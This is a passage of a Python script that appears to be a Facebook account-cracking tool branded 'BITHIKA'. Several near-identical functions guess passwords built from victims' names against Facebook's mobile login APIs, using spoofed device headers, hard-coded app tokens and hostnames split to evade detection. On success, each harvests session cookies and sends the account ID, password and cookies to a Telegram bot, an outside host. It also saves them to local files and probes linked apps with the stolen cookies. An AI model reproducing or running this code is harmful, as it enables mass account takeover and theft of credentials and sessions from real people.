                print(f"\r\r{rad}[{green}COOKIES=[🤖]{rad}]: {warna}{kuki}")
                cek_apk(kuki)
                oks.append(ids)
                statusok = (f" {ids} | {pas} | {kuki} ")
                requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                open('/sdcard/BITHIKA-M2-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/BITHIKA-M6-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
                break
            elif "User must verify their account" in po:
                cps.append(ids)
                #print(f'\r\r{rad}[BITHIKA-CP]{rad} {ids} {rad}| {pas}')
                open('/sdcard/BITHIKA-CP.txt', 'a').write(ids + '|' + pas + '\n')
                break
            else:
                continue
        loop += 1
    except pycurl.error as e:
        time.sleep(10)
    except Exception as e:
        pass


def __MTDTHREE__(ids, names, passlist, total_ids):
    global oks,cps,loop
    animasi = random.choice(["\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA","\x1b[1;97mBITHIKA","\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA"])
    sys.stdout.write(f"\r{rad}[{animasi}-M3{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]{white}-{rad}[\x1b[38;5;38m{'{:.1%}'.format(loop/int(total_ids))}{rad}]"),
    sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Khan'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace('First', first).replace('Last', last).replace('first', ps).replace('last', ps2)
            netheni = str(random.randint(20000, 40000))
            simheni = str(random.randint(20000, 40000))
            user_agent =  DEF3()
            warna = random.choice(my_color)
            adid = str(uuid.uuid4())
            device_id = str(uuid.uuid4())
            family_device_id = str(uuid.uuid4())
            advertiser_id = str(uuid.uuid4())
            data = {
                "adid": f"{adid}",
                "format": "json",
                "device_id": f"{device_id}",
                "cpl": "true",
                "family_device_id": f"{family_device_id}",
                "credentials_type": "device_based_login_password",
                "error_detail_type": "button_with_disabled",
                "source": "device_based_login",
                "email": ids,
                "password": pas,
                "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
                "generate_session_cookies": "1",
                "meta_inf_fbmeta": "",
                "advertiser_id": f"{advertiser_id}",
                "currently_logged_in_userid": "0",
                "locale": "en_US",
                "client_country_code": "US",
                "method": "auth.login",
                "fb_api_req_friendly_name": "authenticate",
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                "api_key": "882a8490361da98702bf97a021ddc14d"}
            headers = [
                f'User-Agent: {user_agent}',
                'Content-Type: application/x-www-form-urlencoded',
                'Host: graph.facebook.com',
                f'X-FB-Net-HNI: {netheni}',
                f'X-FB-SIM-HNI: {simheni}',
                'X-FB-Connection-Type: MOBILE.LTE',
                'X-Tigon-Is-Retry: False',
                'x-fb-session-id: nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                'x-fb-device-group: 5120',
                'X-FB-Friendly-Name: ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags: graphservice',
                'X-FB-HTTP-Engine: Liger',
                'X-FB-Client-IP: True',
                'X-FB-Server-Cluster: True',
                'x-fb-connection-token: d29d67d37eca387482a8a5b740f84f62',
            ]
            url = "https://a"+"pi.face"+"book.com/au"+"th/login"
            buffer = BytesIO()
            c = pycurl.Curl()
            c.setopt(c.URL, 'https://a'+'pi.faceb'+'ook.com/au'+'th/login')
            c.setopt(c.HTTPHEADER, headers)
            c.setopt(c.WRITEDATA, buffer)
            data_encoded = '&'.join([f"{key}={value}" for key, value in data.items()])
            c.setopt(c.POSTFIELDS, data_encoded.encode('utf-8'))
            c.perform()
            c.close()
            po = buffer.getvalue().decode('utf-8')
            q = json.loads(po)
            if 'access_token' in q:
                response_data = json.loads(po)
                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");kuki = f"sb={AJb};{ckkk}"
                print(f'\r\r{rad}[{green}BITHIKA-OK{rad}]{green} {ids} {rad}: {green}{pas}')
                print(f"\r\r{rad}[{green}COOKIES=[🤖]{rad}]: {warna}{cookie}")
                cek_apk(kuki)
                oks.append(ids)
                statusok = (f" {ids} | {pas} | {kuki} ")
                requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                open('/sdcard/BITHIKA-M3-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/BITHIKA-M6-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
                break
            elif "User must verify their account" in po:
                cps.append(ids)
                #print(f'\r\r{rad}[BITHIKA-CP]{rad} {ids} {rad}| {pas}')
                open('/sdcard/BITHIKA-CP.txt', 'a').write(ids + '|' + pas + '\n')
                break
            else:
                continue
        loop += 1
    except pycurl.error as e:
        time.sleep(10)
    except Exception as e:
        pass


def __MTDFOUR__(ids, names, passlist, total_ids):
    global oks,cps,loop
    animasi = random.choice(["\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA","\x1b[1;97mBITHIKA","\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA"])
    sys.stdout.write(f"\r{rad}[{animasi}-M4{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]{white}-{rad}[\x1b[38;5;38m{'{:.1%}'.format(loop/int(total_ids))}{rad}]"),
    sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Khan'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace('First', first).replace('Last', last).replace('first', ps).replace('last', ps2)
            netheni = str(random.randint(20000, 40000))
            simheni = str(random.randint(20000, 40000))
            user_agent = DEF4()
            warna = random.choice(my_color)
            adid = str(uuid.uuid4())
            device_id = str(uuid.uuid4())
            family_device_id = str(uuid.uuid4())
            advertiser_id = str(uuid.uuid4())
            data = {
                "adid": f"{adid}",
                "format": "json",
                "device_id": f"{device_id}",
                "cpl": "true",
                "family_device_id": f"{family_device_id}",
                "credentials_type": "device_based_login_password",
                "error_detail_type": "button_with_disabled",
                "source": "device_based_login",
                "email": ids,
                "password": pas,
                "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
                "generate_session_cookies": "1",
                "meta_inf_fbmeta": "",
                "advertiser_id": f"{advertiser_id}",
                "currently_logged_in_userid": "0",
                "locale": "en_US",
                "client_country_code": "US",
                "method": "auth.login",
                "fb_api_req_friendly_name": "authenticate",
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                "api_key": "882a8490361da98702bf97a021ddc14d"}
            headers = [
                f'User-Agent: {user_agent}',
                'Content-Type: application/x-www-form-urlencoded',
                'Host: graph.facebook.com',
                f'X-FB-Net-HNI: {netheni}',
                f'X-FB-SIM-HNI: {simheni}',
                'X-FB-Connection-Type: MOBILE.LTE',
                'X-Tigon-Is-Retry: False',
                'x-fb-session-id: nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                'x-fb-device-group: 5120',
                'X-FB-Friendly-Name: ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags: graphservice',
                'X-FB-HTTP-Engine: Liger',
                'X-FB-Client-IP: True',
                'X-FB-Server-Cluster: True',
                'x-fb-connection-token: d29d67d37eca387482a8a5b740f84f62'
            ]
            url = 'https://gr'+'aph.face'+'book.co'+'m/au'+'th/lo'+'gin'
            buffer = BytesIO()
            c = pycurl.Curl()
            c.setopt(c.URL, 'https://gr'+'aph.face'+'book.co'+'m/au'+'th/lo'+'gin')
            c.setopt(c.HTTPHEADER, headers)
            c.setopt(c.WRITEDATA, buffer)
            data_encoded = '&'.join([f"{key}={value}" for key, value in data.items()])
            c.setopt(c.POSTFIELDS, data_encoded.encode('utf-8'))
            c.perform()
            c.close()
            po = buffer.getvalue().decode('utf-8')
            q = json.loads(po)
            if 'access_token' in q:
                response_data = json.loads(po)
                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");kuki = f"sb={AJb};{ckkk}"
                print(f'\r\r{rad}[{green}BITHIKA-OK{rad}]{green} {ids} {rad}: {green}{pas}')
                print(f"\r\r{rad}[{green}COOKIES=[🤖]{rad}]: {warna}{kuki}")
                cek_apk(kuki)
                oks.append(ids)
                statusok = (f" {ids} | {pas} | {kuki} ")
                requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                open('/sdcard/BITHIKA-M4-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/BITHIKA-M6-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
                break
            elif "User must verify their account" in po:
                cps.append(ids)
                #print(f'\r\r{rad}[BITHIKA-CP]{rad} {ids} {rad}| {pas}')
                open('/sdcard/BITHIKA-CP.txt', 'a').write(ids + '|' + pas + '\n')
                break
            else:
                continue
        loop += 1
    except pycurl.error as e:
        time.sleep(10)
    except Exception as e:
        pass


def __MTDFIVE__(ids, names, passlist, total_ids):
    global oks,cps,loop
    animasi = random.choice(["\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA","\x1b[1;97mBITHIKA","\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA"])
    sys.stdout.write(f"\r{rad}[{animasi}-M5{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]{white}-{rad}[\x1b[38;5;38m{'{:.1%}'.format(loop/int(total_ids))}{rad}]"),
    sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Khan'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace('First', first).replace('Last', last).replace('first', ps).replace('last', ps2)
            netheni = str(random.randint(20000, 40000))
            simheni = str(random.randint(20000, 40000))
            user_agent = DEF5()
            warna = random.choice(my_color)
            adid = str(uuid.uuid4()).upper()
            device_id = str(uuid.uuid4()).upper()
            family_device_id = str(uuid.uuid4()).upper()
            advertiser_id = str(uuid.uuid4()).upper()
            secure_family_device_id = str(uuid.uuid4()).upper()
            data = {
                "adid": f"{adid}",
                "device_id": f"{device_id}",
                "family_device_id": f"{family_device_id}",
                "secure_family_device_id": f"{secure_family_device_id}",
                "advertiser_id": f"{advertiser_id}",
                "format": "json",
                "cpl": "true",
                "credentials_type": "device_based_login_password",
                "error_detail_type": "button_with_disabled",
                "source": "register_api",
                "email": ids,
                "password": pas,
                "access_token": "275254692598279|585aec5b4c27376758abb7ffcb9db2af",
                "generate_session_cookies": "1",
                "meta_inf_fbmeta": "NO_FILE",     
                "currently_logged_in_userid": "0",
                "locale": random.choice(["ne_NP","en_US","en_GB","bn_IN","in_ID"]),
                "client_country_code": "US",
                "method": "auth.login",
                "fb_api_req_friendly_name": "authenticate",
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                "api_key": "882a8490361da98702bf97a021ddc14d",
                "sig": "cc331688c9ec07059af4df9dbdcf7737"}
            headers = [
                "Host: graph.facebook.com",
                "Authorization: OAuth 275254692598279|585aec5b4c27376758abb7ffcb9db2af",
                f"X-FB-Net-HNI: {netheni}",
                f"X-FB-SIM-HNI: {simheni}",
                f"User-Agent: {user_agent}",
                "X-FB-Client-IP: True",
                "X-FB-Request-Analytics-Tags: graphservice",
                "X-Tigon-Is-Retry: False",
                "X-FB-HTTP-Engine: Liger",
                "X-FB-Connection-Quality: MOBILE.LTE",
                "X-FB-Server-Cluster: True",
                "Connection: keep-alive",
                "x-fb-connection-token: d29d67d37eca387482a8a5b740f84f62",         
                "X-FB-Connection-Bandwidth: 80025933",
                "X-FB-Friendly-Name: ViewerReactionsMutation",
                "Accept-Encoding: gzip, deflate",
                "X-FB-Connection-Type: MOBILE.LTE",
                "Content-Type: application/x-www-form-urlencoded",
            ]
            url = "https://b-gr"+"aph.face"+"book.com/auth/login?incl"+"ude_head"+"ers=false&d"+"ecode_body_json=false&stre"+"amable_json_resp"+"onse=true"
            buffer = BytesIO()
            c = pycurl.Curl()
            c.setopt(c.URL, 'https://b-gr'+'aph.face'+'book.com/aut'+'h/login?include_h'+'eaders=false&de'+'code_body_json=false&str'+'eamable_json_resp'+'onse=true')
            c.setopt(c.HTTPHEADER, headers)
            c.setopt(c.WRITEDATA, buffer)
            data_encoded = '&'.join([f"{key}={value}" for key, value in data.items()])
            c.setopt(c.POSTFIELDS, data_encoded.encode('utf-8'))
            c.perform()
            c.close()
            po = buffer.getvalue().decode('utf-8')
            q = json.loads(po)
            if 'access_token' in q:
                response_data = json.loads(po)
                ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");kuki = f"sb={AJb};{ckkk}"
                print(f'\r\r{rad}[{green}BITHIKA-OK{rad}]{green} {ids} {rad}: {green}{pas}')
                print(f"\r\r{rad}[{green}COOKIES=[??]{rad}]: {warna}{kuki}")
                cek_apk(kuki)
                oks.append(ids)
                statusok = (f" {ids} | {pas} | {kuki} ")
                requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                open('/sdcard/BITHIKA-M6-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/BITHIKA-M6-OK-COOKIE.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
                break
            elif "User must verify their account" in po:
                cps.append(ids)
                #print(f'\r\r{rad}[BITHIKA-CP]{rad} {ids} {rad}| {pas}')
                open('/sdcard/BITHIKA-CP.txt', 'a').write(ids + '|' + pas + '\n')
                break
            else:
                continue
        loop += 1
    except pycurl.error as e:
        time.sleep(10)
    except Exception as e:
        pass

def __MTDSIX__(ids, names, passlist, total_ids):
    global oks,cps,loop
    animasi = random.choice(["\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA","\x1b[1;97mBITHIKA","\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA"])
    sys.stdout.write(f"\r{rad}[{animasi}-M6{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]{white}-{rad}[\x1b[38;5;38m{'{:.1%}'.format(loop/int(total_ids))}{rad}]"),
    sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Khan'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace('First', first).replace('Last', last).replace('first', ps).replace('last', ps2)
            warna = random.choice(my_color)
            session = requests.Session()
            free_fb = session.get('https://m.facebook.com').text
            data = {
            "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":ids,
            "pass":pas,
            "login":"Log In"}
            headers ={'authority':'m.facebook.com',
            'method': 'POST',
            'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-encoding':'gzip, deflate, br',
            'accept-language': 'en-US,en;q=0.9,en;q=0.8',
            'cache-control': 'max-age=0',
            'sec-ch-ua': '"Google Chrome";v="106", "Not)A;Brand";v="99", "Chromium";v="106"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Linux"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36'}
            lo = session.post('https://bn-in.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100',data=data,headers=headers).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                kuki=";".join([f"{key}={session.cookies.get(key)}" for key in ['sb', 'datr', 'ps_n', 'ps_l', 'locale', 'c_user', 'xs', 'fr', 'usida', 'wd', 'm_ls', 'presence']])
                cid = coki[65:80]
                print(f'\r\r{rad}[{green}BITHIKA-OK{rad}]{green} {cid} {rad}: {green}{pas}')
                print(f"\r\r{rad}[{green}COOKIES=[🤖]{rad}]: {warna}{kuki}")
                cek_apk(kuki)
                oks.append(cid)
                statusok = (f" {cid} | {pas} | {kuki} ")
                requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                open('/sdcard/BITHIKA-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/BITHIKA-M6-OK-COOKIE.txt','a').write(cid+'|'+pas+'|'+kuki+'\n')
                break
            elif "User must verify their account" in lo:
                cps.append(ids)
                print(f'\r\r{rad}[BITHIKA-CP]{rad} {ids} {rad}| {pas}')
                open('/sdcard/BITHIKA-CP.txt', 'a').write(ids + '|' + pas + '\n')
                break
            else:
                continue
        loop += 1
    except pycurl.error as e:
        time.sleep(10)
    except Exception as e:
        pass

        pass	
#----------------[ ID-CHECKER ]--------------------------#

def cek_apk(kuki):
	session = requests.Session()
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m➛ %s%s"%(P,H,game[i].replace("Added on"," Added on")))
	except AttributeError:
		print ("\r    %s\033[0m cookie invalid"%(M))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m➛ %s"%(P,game[i].replace("Expired"," Expired")))
	except AttributeError:
		print ("\r    %s \033[0mcookie invalid"%(M))
#-----------------------[ SYSTEM-CONTROL ]--------------------#
os.system("clear")
#Process()
BITHIKA()
